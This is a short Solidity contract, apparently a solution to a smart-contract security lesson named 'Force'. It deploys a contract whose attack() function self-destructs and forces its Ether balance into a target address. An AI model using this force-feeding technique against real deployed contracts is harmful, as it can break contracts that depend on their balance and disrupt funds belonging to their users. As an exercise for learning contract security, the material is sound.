// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../lessons/07-Force.sol";

contract ForceAttack {
    address payable forceAddress;

    constructor(address payable _forceAddress) public {
        forceAddress = _forceAddress;
    }

    function attack() public payable {
        selfdestruct(forceAddress);
    }
}
